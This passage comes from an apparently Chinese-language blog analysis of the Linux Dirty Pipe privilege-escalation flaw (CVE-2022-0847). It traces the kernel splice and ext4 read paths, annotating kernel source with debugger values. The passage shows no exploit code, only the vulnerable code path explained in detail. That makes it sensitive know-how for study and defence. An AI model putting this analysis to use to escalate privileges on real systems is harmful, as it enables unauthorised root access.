class="line">	<span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!(in-&gt;f_mode &amp; FMODE_READ) ||</span><br><span class="line">		     !(out-&gt;f_mode &amp; FMODE_WRITE)))</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	ipipe = <span class="built_in">get_pipe_info</span>(in, <span class="literal">true</span>);				<span class="comment">// 函数返回0x0</span></span><br><span class="line">	opipe = <span class="built_in">get_pipe_info</span>(out, <span class="literal">true</span>);			<span class="comment">// 函数返回正常，所以接下来跳转到了 66 行，奇怪的是，上面的 __do_splice 也有相同的操作。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ipipe &amp;&amp; opipe) &#123;</span><br><span class="line">		<span class="keyword">if</span> (off_in || off_out)</span><br><span class="line">			<span class="keyword">return</span> -ESPIPE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Splicing to self would be fun, but... */</span></span><br><span class="line">		<span class="keyword">if</span> (ipipe == opipe)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)</span><br><span class="line">			flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">splice_pipe_to_pipe</span>(ipipe, opipe, len, flags);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ipipe) &#123;</span><br><span class="line">		<span class="keyword">if</span> (off_in)</span><br><span class="line">			<span class="keyword">return</span> -ESPIPE;</span><br><span class="line">		<span class="keyword">if</span> (off_out) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			offset = *off_out;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			offset = out-&gt;f_pos;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">unlikely</span>(out-&gt;f_flags &amp; O_APPEND))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		ret = <span class="built_in">rw_verify_area</span>(WRITE, out, &amp;offset, len);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">unlikely</span>(ret &lt; <span class="number">0</span>))</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">			flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">file_start_write</span>(out);</span><br><span class="line">		ret = <span class="built_in">do_splice_from</span>(ipipe, out, &amp;offset, len, flags);</span><br><span class="line">		<span class="built_in">file_end_write</span>(out);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!off_out)</span><br><span class="line">			out-&gt;f_pos = offset;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			*off_out = offset;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opipe) &#123;</span><br><span class="line">		<span class="keyword">if</span> (off_out)							<span class="comment">// off_out == 0x0</span></span><br><span class="line">			<span class="keyword">return</span> -ESPIPE;</span><br><span class="line">		<span class="keyword">if</span> (off_in) &#123;							 <span class="comment">// *off_in == 0x3</span></span><br><span class="line">			<span class="keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			offset = *off_in;				<span class="comment">// offset = 0x3</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			offset = in-&gt;f_pos;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)			<span class="comment">// out-&gt;f_flags == 0x1 #define O_NONBLOCK	00004000	没进入该if</span></span><br><span class="line">			flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">pipe_lock</span>(opipe);				<span class="comment">// 加锁处理，证明这里要进行管道写作了，管道的写入一定具有原子性</span></span><br><span class="line">		ret = <span class="built_in">wait_for_space</span>(opipe, flags);				<span class="comment">// 等到可用缓冲区，也可证明这里是写管道</span></span><br><span class="line">		<span class="keyword">if</span> (!ret) &#123;										<span class="comment">// ret == 0x0</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> p_space;</span><br><span class="line">			<span class="comment">// 这里确保了写入的内容小于可用缓冲区大小</span></span><br><span class="line">			<span class="comment">/* Don&#x27;t try to read more the pipe has space for. */</span></span><br><span class="line">			p_space = opipe-&gt;max_usage - <span class="built_in">pipe_occupancy</span>(opipe-&gt;head, opipe-&gt;tail);		<span class="comment">//p_space == 0x10 opipe-&gt;max_usage == 0x10	这里管道头尾值相等且均为0x10，管道为空</span></span><br><span class="line">			len = <span class="built_in">min_t</span>(<span class="keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);							<span class="comment">// len == 0x1</span></span><br><span class="line"></span><br><span class="line">			ret = <span class="built_in">do_splice_to</span>(in, &amp;offset, opipe, len, flags);								<span class="comment">// 跟进</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">pipe_unlock</span>(opipe);</span><br><span class="line">		<span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">wakeup_pipe_readers</span>(opipe);</span><br><span class="line">		<span class="keyword">if</span> (!off_in)</span><br><span class="line">			in-&gt;f_pos = offset;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			*off_in = offset;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4、do-splice-to"><a href="#4、do-splice-to" class="headerlink" title="4、do_splice_to"></a>4、do_splice_to</h4><p>该函数做了一些验证，之后跟进<code>f_op-&gt;splice_read</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to initiate a splice from a file to a pipe.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 尝试启动从文件到管道的接头。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_splice_to</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *ppos,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct pipe_inode_info *pipe, <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!(in-&gt;f_mode &amp; FMODE_READ)))</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	ret = <span class="built_in">rw_verify_area</span>(READ, in, ppos, len);		<span class="comment">// ret == 0，做了某些验证</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(ret &lt; <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(len &gt; MAX_RW_COUNT))</span><br><span class="line">		len = MAX_RW_COUNT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!in-&gt;f_op-&gt;splice_read))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">warn_unsupported</span>(in, <span class="string">&quot;read&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> in-&gt;f_op-&gt;<span class="built_in">splice_read</span>(in, ppos, pipe, len, flags);	<span class="comment">// 跟进</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5、f-op-gt-splice-read"><a href="#5、f-op-gt-splice-read" class="headerlink" title="5、f_op-&gt;splice_read"></a>5、f_op-&gt;splice_read</h4><p>这里的<code>f_op-&gt;splice_read</code>在不同的文件系统中的定义是不一样的</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220323175727953.png" alt="image-20220323175727953"></p>
<p>个人调试漏洞的环境为ext4的文件系统，所以查看ext4内的定义</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.mmap		= ext4_file_mmap,</span><br><span class="line">	.mmap_supported_flags = MAP_SYNC,</span><br><span class="line">	.open		= ext4_file_open,</span><br><span class="line">	.release	= ext4_release_file,</span><br><span class="line">	.fsync		= ext4_sync_file,</span><br><span class="line">	.get_unmapped_area = thp_get_unmapped_area,</span><br><span class="line">	.splice_read	= generic_file_splice_read,</span><br><span class="line">	.splice_write	= iter_file_splice_write,</span><br><span class="line">	.fallocate	= ext4_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以实际调用的函数为<code>generic_file_splice_read</code>。</p>
<h4 id="6、generic-file-splice-read"><a href="#6、generic-file-splice-read" class="headerlink" title="6、generic_file_splice_read"></a>6、generic_file_splice_read</h4><p>将<code>pipe</code>相关的信息与<code>len</code>放入<code>iov_iter</code>结构体实例<code>to</code>中，定义<code>kiocb</code>协助管理I/O。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * generic_file_splice_read - splice data from file to a pipe</span></span><br><span class="line"><span class="comment"> * @in:		file to splice from</span></span><br><span class="line"><span class="comment"> * @ppos:	position in @in</span></span><br><span class="line"><span class="comment"> * @pipe:	pipe to splice to</span></span><br><span class="line"><span class="comment"> * @len:	number of bytes to splice</span></span><br><span class="line"><span class="comment"> * @flags:	splice modifier flags</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *    Will read pages from given file and fill them into a pipe. Can be</span></span><br><span class="line"><span class="comment"> *    used as long as it has more or less sane -&gt;read_iter().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * generic_file_splice_read - 将数据从文件拼接到管道</span></span><br><span class="line"><span class="comment">  * @in: 要拼接的文件</span></span><br><span class="line"><span class="comment">  * @ppos：@in 中的位置</span></span><br><span class="line"><span class="comment">  * @pipe: 要拼接的管道</span></span><br><span class="line"><span class="comment">  * @len: 要拼接的字节数</span></span><br><span class="line"><span class="comment">  * @flags: 拼接修饰符标志</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 描述：</span></span><br><span class="line"><span class="comment">  * 将从给定文件中读取页面并将它们填充到管道中。 只要它具有或多或少的 sane -&gt;read_iter() 就可以使用。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">generic_file_splice_read</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *ppos,</span></span></span><br><span class="line"><span class="params"><span class="function">				 struct pipe_inode_info *pipe, <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span>		<span class="comment">// in 传入的文件结构体，ppos == 0x3， pipe为传入的管道，len == 0x1，flags == 0x0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">to</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kiocb</span> <span class="title">kiocb</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i_head;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">iov_iter_pipe</span>(&amp;to, READ, pipe, len);			<span class="comment">// 使用 pipe 和 len 对  to 进行初始化，将 pipe ,pipe-&gt;head , len 等的值都传入 to 的各个成员中。</span></span><br><span class="line">	i_head = to.head;</span><br><span class="line">	<span class="built_in">init_sync_kiocb</span>(&amp;kiocb, in);		<span class="comment">// 利用 in 对 kiocb 进行的初始化 ，kiocb是Linux内核中协助异步I/O操作的数据类型</span></span><br><span class="line">	kiocb.ki_pos = *ppos;</span><br><span class="line">	ret = <span class="built_in">call_read_iter</span>(in, &amp;kiocb, &amp;to);			<span class="comment">// 跟进</span></span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		*ppos = kiocb.ki_pos;</span><br><span class="line">		<span class="built_in">file_accessed</span>(in);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		to.head = i_head;</span><br><span class="line">		to.iov_offset = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">iov_iter_advance</span>(&amp;to, <span class="number">0</span>); <span class="comment">/* to free what was emitted */</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * callers of -&gt;splice_read() expect -EAGAIN on</span></span><br><span class="line"><span class="comment">		 * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ret == -EFAULT)</span><br><span class="line">			ret = -EAGAIN;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="7、call-read-iter-amp-f-op-gt-read-iter"><a href="#7、call-read-iter-amp-f-op-gt-read-iter" class="headerlink" title="7、call_read_iter &amp; f_op-&gt;read_iter"></a>7、call_read_iter &amp; f_op-&gt;read_iter</h4><p>和之前一样，找到ext4文件系统</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ssize_t</span> <span class="title">call_read_iter</span><span class="params">(struct file *file, struct kiocb *kio,</span></span></span><br><span class="line"><span class="params"><span class="function">				     struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> file-&gt;f_op-&gt;<span class="built_in">read_iter</span>(kio, iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220324145017554.png" alt="image-20220324145017554"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_file_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= ext4_llseek,</span><br><span class="line">	.read_iter	= ext4_file_read_iter,			<span class="comment">// 跟进</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<h4 id="8、ext4-file-read-iter"><a href="#8、ext4-file-read-iter" class="headerlink" title="8、ext4_file_read_iter"></a>8、ext4_file_read_iter</h4><p>跟进<code>generic_file_read_iter</code>函数。这里传入的参数分别为<code>kiocb</code>的实例以及<code>iov_iter</code>的实例。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">ext4_file_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="built_in">file_inode</span>(iocb-&gt;ki_filp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">ext4_forced_shutdown</span>(<span class="built_in">EXT4_SB</span>(inode-&gt;i_sb))))</span><br><span class="line">		<span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(to))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FS_DAX</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IS_DAX</span>(inode))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">ext4_dax_read_iter</span>(iocb, to);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)		<span class="comment">// iocb-&gt;ki_flags == 0x0</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">ext4_dio_read_iter</span>(iocb, to);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">generic_file_read_iter</span>(iocb, to);			<span class="comment">// 跟进，此时 iocb 可以索引到传入的file，to 可以索引到传入的pipe。iocb-&gt;ki_filp 为指向file的指针，to-&gt;count 为splice的长度，to-&gt;pipe 为指向pipe的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="9、generic-file-read-iter"><a href="#9、generic-file-read-iter" class="headerlink" title="9、generic_file_read_iter"></a>9、generic_file_read_iter</h4><p>没做啥操作，大if跳过去了，跟进<code>generic_file_buffered_read</code>函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下翻译自源码注释</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * generic_file_read_iter - 通用文件系统读取例程</span></span><br><span class="line"><span class="comment">  * @iocb: 内核 I/O 控制块</span></span><br><span class="line"><span class="comment">  * @iter: 读取数据的目的地</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 这是所有可以直接使用页面缓存的文件系统的“read_iter()”例程。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * iocb-&gt;ki_flags 中的 IOCB_NOWAIT 标志表示在不等待 I/O 请求完成而无法读取数据时应返回 -EAGAIN； 它不会阻止预读。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * iocb-&gt;ki_flags 中的 IOCB_NOIO 标志表示不应为读取或预读发出新的 I/O 请求。 当无法读取数据时，应返回-EAGAIN。 当触发预读时，应返回部分的、可能为空的读取。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 返回：</span></span><br><span class="line"><span class="comment">  * * 复制的字节数，即使对于部分读取负错误代码（如果 IOCB_NOIO 则为 0）如果没有读取任何内容</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">generic_file_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> count = <span class="built_in">iov_iter_count</span>(iter);			<span class="comment">// count == 0x1，为读取内容的长度，也就是我们传入的参数</span></span><br><span class="line">	<span class="keyword">ssize_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!count)</span><br><span class="line">		<span class="keyword">goto</span> out; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;			<span class="comment">// iocb-&gt;ki_flags == 0x0，所以没进入该if</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> file-&gt;f_mapping;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> mapping-&gt;host;</span><br><span class="line">		<span class="keyword">loff_t</span> size;</span><br><span class="line"></span><br><span class="line">		size = <span class="built_in">i_size_read</span>(inode);</span><br><span class="line">		<span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">filemap_range_has_page</span>(mapping, iocb-&gt;ki_pos,</span><br><span class="line">						   iocb-&gt;ki_pos + count - <span class="number">1</span>))</span><br><span class="line">				<span class="keyword">return</span> -EAGAIN;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			retval = <span class="built_in">filemap_write_and_wait_range</span>(mapping,</span><br><span class="line">						iocb-&gt;ki_pos,</span><br><span class="line">					        iocb-&gt;ki_pos + count - <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">file_accessed</span>(file);</span><br><span class="line"></span><br><span class="line">		retval = mapping-&gt;a_ops-&gt;<span class="built_in">direct_IO</span>(iocb, iter);</span><br><span class="line">		<span class="keyword">if</span> (retval &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">			iocb-&gt;ki_pos += retval;</span><br><span class="line">			count -= retval;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">iov_iter_revert</span>(iter, count - <span class="built_in">iov_iter_count</span>(iter));</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Btrfs can have a short DIO read if we encounter</span></span><br><span class="line"><span class="comment">		 * compressed extents, so if there was an error, or if</span></span><br><span class="line"><span class="comment">		 * we&#x27;ve already read everything we wanted to, or if</span></span><br><span class="line"><span class="comment">		 * there was a short read because we hit EOF, go ahead</span></span><br><span class="line"><span class="comment">		 * and return.  Otherwise fallthrough to buffered io for</span></span><br><span class="line"><span class="comment">		 * the rest of the read.  Buffered reads will not work for</span></span><br><span class="line"><span class="comment">		 * DAX files, so don&#x27;t bother trying.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">如果我们遇到压缩范围，Btrfs 可以进行短 DIO 读取，因此如果出现错误，或者如果我们已经读取了我们想要的所有内容，或者因为我们遇到 EOF 而导致短读取，请继续并返回。 否则，在其余的读取过程中将使用缓冲 io。 缓冲读取不适用于 DAX 文件，因此不要费心尝试。</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">if</span> (retval &lt; <span class="number">0</span> || !count || iocb-&gt;ki_pos &gt;= size ||</span><br><span class="line">		    <span class="built_in">IS_DAX</span>(inode))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	retval = <span class="built_in">generic_file_buffered_read</span>(iocb, iter, retval);	<span class="comment">// retval == 0x0 ，跟进</span></span><br><span class="line">out:	</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="10、generic-file-buffered-read"><a href="#10、generic-file-buffered-read" class="headerlink" title="10、generic_file_buffered_read"></a>10、generic_file_buffered_read</h4><p>这里通过<code>kmalloc_array</code>函数为<code>pages</code>生成一块空间，并通过<code>generic_file_buffered_read_get_pages</code>将<code>iocb</code>的部分内容传入pages。之后调用<code>copy_page_to_iter</code>。</p>
